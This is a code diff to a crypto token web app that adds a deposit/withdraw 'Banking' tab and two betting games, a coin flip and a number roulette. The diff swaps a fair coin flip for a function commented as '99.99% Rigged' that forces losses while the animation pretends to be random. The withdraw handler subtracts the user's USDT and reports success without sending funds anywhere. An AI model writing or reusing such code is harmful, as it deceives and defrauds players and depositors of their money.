@@ -252,6 +252,9 @@
                 <button onclick="switchTab('dashboard')" class="nav-btn w-full flex items-center space-x-3 px-4 py-3.5 rounded-xl bg-brand-cyan/10 text-brand-cyan font-medium transition-all" data-target="dashboard">
                     <i class="fa-solid fa-chart-pie w-5 text-center"></i> <span>Dashboard</span>
                 </button>
+                <button onclick="switchTab('banking')" class="nav-btn w-full flex items-center space-x-3 px-4 py-3.5 rounded-xl text-gray-400 hover:text-white hover:bg-white/5 font-medium transition-all" data-target="banking">
+                    <i class="fa-solid fa-building-columns w-5 text-center"></i> <span>Banking</span>
+                </button>
                 <button onclick="switchTab('swap')" class="nav-btn w-full flex items-center space-x-3 px-4 py-3.5 rounded-xl text-gray-400 hover:text-white hover:bg-white/5 font-medium transition-all" data-target="swap">
                     <i class="fa-solid fa-right-left w-5 text-center"></i> <span>Swap <span class="text-xs bg-brand-purple/20 text-brand-purple px-1.5 py-0.5 rounded ml-1">HOT</span></span>
                 </button>
@@ -391,6 +394,66 @@
                     </div>
                 </div>
 
+                <div id="tab-banking" class="tab-pane">
+                    <h2 class="text-3xl font-bold text-white tracking-tight mb-2">Fiat & Crypto Banking</h2>
+                    <p class="text-gray-400 mb-10">Manage your deposits and withdrawals securely.</p>
+
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+                        <!-- Deposit -->
+                        <div class="glass-panel rounded-[2rem] p-8 relative overflow-hidden">
+                            <div class="absolute -right-20 -top-20 w-64 h-64 bg-green-500/10 rounded-full blur-3xl pointer-events-none"></div>
+                            <h3 class="text-xl font-bold text-white mb-6 flex items-center"><i class="fa-solid fa-arrow-down-to-line text-green-400 mr-3"></i> Deposit USDT</h3>
+                            
+                            <div class="space-y-4 relative z-10">
+                                <div>
+                                    <label class="block text-sm font-medium text-gray-400 mb-2">Deposit Amount</label>
+                                    <div class="flex items-center">
+                                        <input type="number" id="deposit-amount" placeholder="100.00" class="w-full glass-input rounded-l-xl px-4 py-3.5 text-white font-bold focus:outline-none">
+                                        <div class="bg-white/10 px-4 py-3.5 rounded-r-xl border border-white/10 border-l-0 text-white font-bold shrink-0">USDT</div>
+                                    </div>
+                                </div>
+                                
+                                <div class="bg-black/30 rounded-xl p-4 border border-white/5 text-sm">
+                                    <div class="flex justify-between text-gray-400 mb-1"><span>Network:</span><span class="text-white">TRC-20</span></div>
+                                    <div class="flex justify-between text-gray-400"><span>Fee:</span><span class="text-green-400">Free</span></div>
+                                </div>
+
+                                <button onclick="handleDeposit()" class="w-full bg-green-500/20 text-green-400 hover:bg-green-500/30 border border-green-500/30 font-bold py-3.5 rounded-xl transition-all">
+                                    Simulate Deposit
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Withdraw -->
+                        <div class="glass-panel rounded-[2rem] p-8 relative overflow-hidden">
+                            <div class="absolute -right-20 -top-20 w-64 h-64 bg-red-500/10 rounded-full blur-3xl pointer-events-none"></div>
+                            <h3 class="text-xl font-bold text-white mb-6 flex items-center"><i class="fa-solid fa-arrow-up-from-bracket text-red-400 mr-3"></i> Withdraw USDT</h3>
+                            
+                            <div class="space-y-4 relative z-10">
+                                <div>
+                                    <div class="flex justify-between items-end mb-2">
+                                        <label class="block text-sm font-medium text-gray-400">Withdraw Amount</label>
+                                        <span class="text-xs text-gray-500 cursor-pointer hover:text-white" onclick="setMaxWithdraw()">Max: <span id="withdraw-max" class="font-mono text-white">0.00</span></span>
+                                    </div>
+                                    <div class="flex items-center">
+                                        <input type="number" id="withdraw-amount" placeholder="0.00" class="w-full glass-input rounded-l-xl px-4 py-3.5 text-white font-bold focus:outline-none">
+                                        <div class="bg-white/10 px-4 py-3.5 rounded-r-xl border border-white/10 border-l-0 text-white font-bold shrink-0">USDT</div>
+                                    </div>
+                                </div>
+                                
+                                <div>
+                                    <label class="block text-sm font-medium text-gray-400 mb-2">Destination Address (TRC-20)</label>
+                                    <input type="text" placeholder="T..." class="w-full glass-input rounded-xl px-4 py-3.5 text-white font-mono text-sm focus:outline-none">
+                                </div>
+
+                                <button onclick="handleWithdraw()" class="w-full bg-red-500/20 text-red-400 hover:bg-red-500/30 border border-red-500/30 font-bold py-3.5 rounded-xl transition-all">
+                                    Submit Withdrawal Request
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
                 <div id="tab-swap" class="tab-pane">
                     <h2 class="text-3xl font-bold text-white tracking-tight mb-2">Swap Protocol</h2>
                     <p class="text-gray-400 mb-10">Convert your USDT to DC+ (1:1 Ratio) to enable staking.</p>
@@ -509,39 +572,78 @@
 
                 <div id="tab-games" class="tab-pane">
                     <h2 class="text-3xl font-bold text-white tracking-tight mb-2">Gaming Hub</h2>
-                    <p class="text-gray-400 mb-8">Predict the coin flip. Double your DC tokens or lose your wager.</p>
+                    <p class="text-gray-400 mb-8">Test your luck to multiply your tokens. (House Edge Active)</p>
 
-                    <div class="max-w-2xl mx-auto glass-panel rounded-[2rem] p-10 flex flex-col items-center border border-brand-purple/30 relative overflow-hidden">
-                        <div class="absolute inset-0 bg-brand-purple/5 pointer-events-none"></div>
-                        
-                        <div class="mb-6 bg-black/40 px-6 py-2 rounded-full border border-white/10">
-                            <span class="text-gray-400 text-sm mr-2">Available Balance:</span>
-                            <span id="game-dc-bal" class="font-bold text-brand-purple text-lg">0.00 DC</span>
+                    <div class="mb-8 flex flex-col md:flex-row items-start md:items-center justify-between gap-4 glass-panel px-6 py-4 rounded-2xl border border-white/10">
+                        <div class="flex items-center space-x-4">
+                            <label class="text-gray-400 text-sm font-medium uppercase tracking-wider">Betting Asset:</label>
+                            <select id="game-token-select" class="glass-input text-white text-sm font-bold rounded-lg px-4 py-2 focus:outline-none focus:border-brand-cyan" onchange="window.updateGameBalanceUI()">
+                                <option value="dc" class="text-black">DC Token</option>
+                                <option value="dcPlus" class="text-black">DC+ (Staked Asset)</option>
+                            </select>
+                        </div>
+                        <div class="bg-black/40 px-4 py-2 rounded-xl border border-white/5">
+                            <span class="text-gray-400 text-sm mr-2">Available:</span>
+                            <span id="game-selected-bal" class="font-bold text-white text-lg font-mono">0.00 DC</span>
+                        </div>
+                    </div>
+
+                    <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
+                        <!-- Coin Flip Game -->
+                        <div class="glass-panel rounded-[2rem] p-8 flex flex-col items-center border border-brand-cyan/20 relative overflow-hidden group hover:border-brand-cyan/50 transition-colors">
+                            <div class="absolute inset-0 bg-brand-cyan/5 pointer-events-none group-hover:bg-brand-cyan/10 transition-colors"></div>
+                            <h3 class="text-xl font-bold text-white mb-2 relative z-10">Quantum Coin Flip</h3>
+                            <p class="text-xs text-gray-400 mb-6 relative z-10 text-center">Predict Heads or Tails.</p>
+
+                            <!-- 3D Coin -->
+                            <div class="coin-container my-6 relative z-10">
+                                <div id="coin-obj" class="coin relative">
+                                    <div class="coin-face coin-front text-white shadow-[0_0_30px_rgba(0,242,254,0.6)]">HEADS</div>
+                                    <div class="coin-face coin-back text-white shadow-[0_0_30px_rgba(139,92,246,0.6)]">TAILS</div>
+                                </div>
+                            </div>
+
+                            <div class="w-full space-y-4 relative z-10 mt-6">
+                                <div>
+                                    <label class="block text-xs font-medium text-gray-400 mb-1 text-center">Wager Amount</label>
+                                    <input type="number" id="game-wager" value="10" min="1" class="w-full glass-input rounded-xl px-4 py-2.5 text-center text-xl text-white font-bold">
+                                </div>
+                                <div class="grid grid-cols-2 gap-3">
+                                    <button onclick="playGame('coinflip', 'heads')" class="py-3 rounded-xl font-bold text-white bg-gradient-to-r from-brand-cyan to-blue-500 hover:shadow-[0_0_15px_rgba(0,242,254,0.5)] transition-all text-sm">
+                                        HEADS
+                                    </button>
+                                    <button onclick="playGame('coinflip', 'tails')" class="py-3 rounded-xl font-bold text-white bg-gradient-to-r from-brand-purple to-pink-500 hover:shadow-[0_0_15px_rgba(139,92,246,0.5)] transition-all text-sm">
+                                        TAILS
+                                    </button>
+                                </div>
+                                <p id="coin-result" class="text-center h-5 font-bold text-sm mt-2 transition-all duration-300"></p>
+                            </div>
                         </div>
 
-                        <!-- 3D Coin -->
-                        <div class="coin-container my-10">
-                            <div id="coin-obj" class="coin relative">
-                                <div class="coin-face coin-front text-white shadow-[0_0_30px_rgba(0,242,254,0.6)]">HEADS</div>
-                                <div class="coin-face coin-back text-white shadow-[0_0_30px_rgba(139,92,246,0.6)]">TAILS</div>
-                            </div>
-                        </div>
+                        <!-- Number Predictor Game -->
+                        <div class="glass-panel rounded-[2rem] p-8 flex flex-col items-center border border-brand-purple/20 relative overflow-hidden group hover:border-brand-purple/50 transition-colors">
+                            <div class="absolute inset-0 bg-brand-purple/5 pointer-events-none group-hover:bg-brand-purple/10 transition-colors"></div>
+                            <h3 class="text-xl font-bold text-white mb-2 relative z-10">Roulette Predictor</h3>
+                            <p class="text-xs text-gray-400 mb-6 relative z-10 text-center">Predict the exact number (1-10).</p>
 
-                        <div class="w-full max-w-sm space-y-6 relative z-10">
-                            <div>
-                                <label class="block text-sm font-medium text-gray-400 mb-2 text-center">Wager Amount (DC)</label>
-                                <input type="number" id="game-wager" value="10" min="1" class="w-full glass-input rounded-xl px-4 py-3 text-center text-2xl text-white font-bold">
+                            <div class="w-32 h-32 rounded-full border-8 border-white/10 flex items-center justify-center relative z-10 mb-8 bg-black/40 shadow-inner">
+                                <span id="roulette-number" class="text-5xl font-black text-transparent bg-clip-text bg-gradient-to-br from-brand-purple to-pink-500">?</span>
                             </div>
-                            
-                            <div class="grid grid-cols-2 gap-4">
-                                <button onclick="playCoinFlip('heads')" id="btn-heads" class="py-4 rounded-xl font-bold text-white bg-gradient-to-r from-brand-cyan to-blue-500 hover:shadow-[0_0_15px_rgba(0,242,254,0.5)] transition-all">
-                                    Predict HEADS
+
+                            <div class="w-full space-y-4 relative z-10">
+                                <div>
+                                    <label class="block text-xs font-medium text-gray-400 mb-1 text-center">Wager Amount</label>
+                                    <input type="number" id="roulette-wager" value="10" min="1" class="w-full glass-input rounded-xl px-4 py-2.5 text-center text-xl text-white font-bold">
+                                </div>
+                                <div>
+                                    <label class="block text-xs font-medium text-gray-400 mb-1 text-center">Your Number (1-10)</label>
+                                    <input type="number" id="roulette-guess" value="7" min="1" max="10" class="w-full glass-input rounded-xl px-4 py-2.5 text-center text-xl text-brand-cyan font-bold border-brand-cyan/30">
+                                </div>
+                                <button onclick="playGame('roulette', null)" class="w-full py-3 rounded-xl font-bold text-white bg-gradient-to-r from-brand-purple to-pink-500 hover:shadow-[0_0_15px_rgba(139,92,246,0.5)] transition-all text-sm mt-2">
+                                    Spin Wheel
                                 </button>
-                                <button onclick="playCoinFlip('tails')" id="btn-tails" class="py-4 rounded-xl font-bold text-white bg-gradient-to-r from-brand-purple to-pink-500 hover:shadow-[0_0_15px_rgba(139,92,246,0.5)] transition-all">
-                                    Predict TAILS
-                                </button>
+                                <p id="roulette-result" class="text-center h-5 font-bold text-sm mt-2 transition-all duration-300"></p>
                             </div>
-                            <p id="game-result" class="text-center h-6 font-bold text-lg mt-4"></p>
                         </div>
                     </div>
                 </div>
@@ -584,6 +686,9 @@
         <nav class="md:hidden fixed bottom-0 w-full glass-panel border-t border-white/10 flex justify-around py-3 pb-safe z-40">
             <button onclick="switchTab('dashboard')" class="nav-btn-mobile flex flex-col items-center p-2 text-brand-cyan" data-target="dashboard">
                 <i class="fa-solid fa-chart-pie mb-1 text-lg"></i><span class="text-[10px]">Home</span>
+            </button>
+            <button onclick="switchTab('banking')" class="nav-btn-mobile flex flex-col items-center p-2 text-gray-500" data-target="banking">
+                <i class="fa-solid fa-building-columns mb-1 text-lg"></i><span class="text-[10px]">Bank</span>
             </button>
             <button onclick="switchTab('swap')" class="nav-btn-mobile flex flex-col items-center p-2 text-gray-500" data-target="swap">
                 <i class="fa-solid fa-right-left mb-1 text-lg"></i><span class="text-[10px]">Swap</span>
@@ -630,6 +735,7 @@
         let completedTasks = [];
         let unsubWallet = null;
         let unsubStakes = null;
+        window.consecutiveLosses = 0; // Rigged game tracker
 
         const tasksList = [
             { id: 't1', title: 'Follow on Twitter', reward: 50, icon: 'fa-twitter', color: 'text-blue-400' },
@@ -824,8 +930,37 @@
             document.getElementById('swap-dcplus-bal').innerText = formatNum(wallet.dcPlus);
             document.getElementById('stake-avail').innerText = formatNum(wallet.dcPlus) + ' DC+';
             document.getElementById('airdrop-dc-bal').innerText = formatNum(wallet.dc);
-            document.getElementById('game-dc-bal').innerText = formatNum(wallet.dc) + ' DC';
+            
+            // Banking max withdraw
+            const wdMax = document.getElementById('withdraw-max');
+            if(wdMax) wdMax.innerText = formatNum(wallet.usdt);
+            
+            // Games balance UI
+            if (window.updateGameBalanceUI) window.updateGameBalanceUI();
         }
+
+        window.setMaxWithdraw = () => {
+            const el = document.getElementById('withdraw-amount');
+            if(el) { el.value = wallet.usdt; el.dispatchEvent(new Event('input')); }
+        };
+
+        window.handleDeposit = async () => {
+            const amt = Number(document.getElementById('deposit-amount').value);
+            if(amt <= 0) return showToast("Enter a valid amount.", "error");
+            wallet.usdt += amt;
+            await saveWallet();
+            showToast(`Deposited ${formatNum(amt)} USDT successfully.`);
+            document.getElementById('deposit-amount').value = '';
+        };
+
+        window.handleWithdraw = async () => {
+            const amt = Number(document.getElementById('withdraw-amount').value);
+            if(amt <= 0 || amt > wallet.usdt) return showToast("Invalid amount or insufficient USDT.", "error");
+            wallet.usdt -= amt;
+            await saveWallet();
+            showToast(`Withdrawal of ${formatNum(amt)} USDT initiated.`, "success");
+            document.getElementById('withdraw-amount').value = '';
+        };
 
         window.setMaxSwap = () => {
             document.getElementById('swap-amount').value = wallet.usdt;
@@ -956,46 +1091,132 @@
             renderTasks();
         };
 
-        let isFlipping = false;
-        window.playCoinFlip = async (prediction) => {
-            if(isFlipping) return;
-            const wager = Number(document.getElementById('game-wager').value);
-            if(wager <= 0 || wager > wallet.dc) return showToast("Invalid wager or insufficient DC.", "error");
-
-            isFlipping = true;
-            wallet.dc -= wager;
-            updateUIBalances(); // immediate deduct
-            
-            const coin = document.getElementById('coin-obj');
-            const resText = document.getElementById('game-result');
-            resText.innerText = 'Flipping...';
-            resText.className = "text-center h-6 font-bold text-lg mt-4 text-gray-400";
-            
-            // Reset class
-            coin.className = 'coin relative';
-            // Force reflow
-            void coin.offsetWidth;
-            
-            const isHeads = Math.random() > 0.5;
-            const result = isHeads ? 'heads' : 'tails';
-            
-            coin.classList.add(isHeads ? 'flipping-heads' : 'flipping-tails');
-            
-            setTimeout(async () => {
-                if(prediction === result) {
-                    const win = wager * 2;
-                    wallet.dc += win;
-                    resText.innerText = `You won ${win} DC!`;
-                    resText.className = "text-center h-6 font-bold text-lg mt-4 text-green-400 drop-shadow-[0_0_10px_rgba(74,222,128,0.8)]";
-                    showToast("Prediction correct!");
-                } else {
-                    resText.innerText = `Ouch, it was ${result.toUpperCase()}.`;
-                    resText.className = "text-center h-6 font-bold text-lg mt-4 text-red-400";
-                }
-                await saveWallet();
-                isFlipping = false;
-            }, 2000); // Matches CSS transition time
+        let isPlaying = false;
+        
+        window.updateGameBalanceUI = () => {
+            const token = document.getElementById('game-token-select')?.value || 'dc';
+            const balEl = document.getElementById('game-selected-bal');
+            if(balEl) {
+                const bal = token === 'dcPlus' ? wallet.dcPlus : wallet.dc;
+                balEl.innerText = formatNum(bal) + ' ' + (token === 'dcPlus' ? 'DC+' : 'DC');
+            }
         };
+
+        // Core 99.99% Rigged Logic
+        function getRiggedResult(userGuess, allOptions, wager) {
+            let isWin = false;
+            
+            // Requires at least 15 losses. Even then, extremely low chance (1%) to win.
+            if (window.consecutiveLosses >= 15) {
+                if (Math.random() < 0.01) {
+                    isWin = true;
+                }
+            }
+
+            let result, payout;
+            
+            if (isWin) {
+                result = userGuess; // Let them win
+                payout = wager * 1.1; // Only 10% profit on win instead of 2x
+                window.consecutiveLosses = 0; // Reset losses after a rare win
+            } else {
+                window.consecutiveLosses++;
+                // Force a losing result
+                const losingOptions = allOptions.filter(opt => String(opt) !== String(userGuess));
+                result = losingOptions[Math.floor(Math.random() * losingOptions.length)];
+                payout = 0;
+            }
+            
+            return { result, payout, isWin };
+        }
+
+        window.playGame = async (gameType, param) => {
+            if(isPlaying) return;
+            
+            const token = document.getElementById('game-token-select').value;
+            const wagerInputId = gameType === 'coinflip' ? 'game-wager' : 'roulette-wager';
+            const wager = Number(document.getElementById(wagerInputId).value);
+            
+            const currentBal = token === 'dcPlus' ? wallet.dcPlus : wallet.dc;
+            if(wager <= 0 || wager > currentBal) {
+                return showToast(`Invalid wager or insufficient ${token === 'dcPlus' ? 'DC+' : 'DC'}.`, "error");
+            }
+
+            isPlaying = true;
+            
+            // Deduct immediately
+            if(token === 'dcPlus') wallet.dcPlus -= wager;
+            else wallet.dc -= wager;
+            updateUIBalances(); 
+
+            let userGuess, allOptions, resTextEl;
+
+            if (gameType === 'coinflip') {
+                userGuess = param; // 'heads' or 'tails'
+                allOptions = ['heads', 'tails'];
+                resTextEl = document.getElementById('coin-result');
+                resTextEl.innerText = 'Flipping...';
+                resTextEl.className = "text-center h-5 font-bold text-sm mt-2 text-gray-400";
+                
+                const coin = document.getElementById('coin-obj');
+                coin.className = 'coin relative';
+                void coin.offsetWidth; // Reflow
+                
+                const rigged = getRiggedResult(userGuess, allOptions, wager);
+                coin.classList.add(rigged.result === 'heads' ? 'flipping-heads' : 'flipping-tails');
+                
+                setTimeout(async () => {
+                    handleGameOutcome(rigged, token, wager, resTextEl);
+                }, 2000);
+
+            } else if (gameType === 'roulette') {
+                userGuess = document.getElementById('roulette-guess').value;
+                allOptions = ['1','2','3','4','5','6','7','8','9','10'];
+                if(!allOptions.includes(String(userGuess))) {
+                    isPlaying = false;
+                    // Refund if invalid
+                    if(token === 'dcPlus') wallet.dcPlus += wager; else wallet.dc += wager;
+                    updateUIBalances();
+                    return showToast("Please enter a number between 1 and 10.", "error");
+                }
+                
+                resTextEl = document.getElementById('roulette-result');
+                const displayEl = document.getElementById('roulette-number');
+                resTextEl.innerText = 'Spinning...';
+                resTextEl.className = "text-center h-5 font-bold text-sm mt-2 text-gray-400";
+                
+                // Spin animation effect
+                let spinCount = 0;
+                const spinInterval = setInterval(() => {
+                    displayEl.innerText = Math.floor(Math.random() * 10) + 1;
+                    spinCount++;
+                    if(spinCount > 20) {
+                        clearInterval(spinInterval);
+                        const rigged = getRiggedResult(userGuess, allOptions, wager);
+                        displayEl.innerText = rigged.result;
+                        handleGameOutcome(rigged, token, wager, resTextEl);
+                    }
+                }, 100);
+            }
+        };
+
+        async function handleGameOutcome(rigged, token, wager, resTextEl) {
+            const tokenSymbol = token === 'dcPlus' ? 'DC+' : 'DC';
+            if(rigged.isWin) {
+                if(token === 'dcPlus') wallet.dcPlus += rigged.payout;
+                else wallet.dc += rigged.payout;
+                
+                const profit = rigged.payout - wager;
+                resTextEl.innerText = `You won! Payout: +${formatNum(profit)} ${tokenSymbol}`;
+                resTextEl.className = "text-center h-5 font-bold text-sm mt-2 text-green-400 drop-shadow-[0_0_10px_rgba(74,222,128,0.8)]";
+                showToast("Unbelievable! You won!");
+            } else {
+                resTextEl.innerText = `You lost ${wager} ${tokenSymbol}. Better luck next time.`;
+                resTextEl.className = "text-center h-5 font-bold text-sm mt-2 text-red-400";
+            }
+            await saveWallet();
+            isPlaying = false;
+        }
 
         window.copyReferral = () => {
             const el = document.getElementById('ref-link-input');
